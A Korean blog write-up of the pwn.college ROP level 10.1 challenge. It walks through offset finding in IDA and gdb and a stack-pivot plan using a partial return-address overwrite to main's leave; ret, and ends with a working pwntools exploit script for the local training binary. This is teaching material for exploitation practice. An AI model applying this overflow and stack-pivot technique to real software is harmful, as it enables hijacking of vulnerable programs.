---
title: "[pwn.college] ROP Level10.1 Write up"
author: d0razi
date: 2023-09-09 9:30
categories: [InfoSec, Pwn]
tags: [Write up, pwn.college]
image: /assets/img/media/banner/pwn-college.png
---

## **문제 분석**

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled.png)

입력 버퍼 주소를 알려주네요.

이번 문제는 너무 안 풀려서 IDA의 도움을 받았습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%201.png)

9번째 라인을 보면 sub_2038 함수를 dest[0]에 복사합니다. 그리고 입력 버퍼는 dest[1]에 존재합니다.

sub_2038함수를 보면 win 함수인걸 알 수 있습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%202.png)

일단 시나리오를 짜기전 필요한 정보들부터 정리해보겠습니다.

- Input - rbp 오프셋
- 입력버퍼 - win address 포인터 오프셋

### **Input - Rbp 오프셋**

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%203.png)

오프셋 : 0x78

### **입력버퍼 - win address 포인터 오프셋**

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%204.png)

먼저 memcpy 함수 호출 할 때 브레이크 포인트를 설정해서 rdi 레지스터 값을 확인해서 win 함수 포인터의 주소를 확인해보겠습니다.

`b* challenge+143`

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%205.png)

이제 read 함수 이후에 브레이크 포인트를 설정한 후 오프셋 계산을 하면 될 것 같습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%206.png)

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level10.1/Untitled%207.png)

win함수 포인터 = 입력버퍼 - 8

## **익스플로잇**

시나리오는 아래처럼 짰습니다. **Stack pivoting**

- 0x78만큼 더미데이터 입력후 SFP에 [win 함수(Input buffer - 8) - 8]을 입력 후 리턴 주소에 main leave; ret 사용해서 흐름을 win 함수로 조작

### **main leave; ret**

pie가 적용되어 있지만 끝 한 바이트만 변경해주면 main 함수의 다른 위치로 이동이 가능합니다.

> `main+100 -> call vuln -> main+101`
위와 같은 상황이면 vuln ret의 끝 한바이트만 바꾸면 main함수의 다른 주소로 흐름 조작이 가능합니다
> 

### **Exploit code**

```python
from pwn import *

p = process('/challenge/babyrop_level10.1')

p.recvuntil(b': ')
buffer = int(p.recvline()[:-2], 16)

print("buffer : ", hex(buffer))

pay = b'A' * 0x78 
pay += p64(buffer - 0x10) ## win address
pay += b'\x66' 

p.send(pay)
p.interactive()
```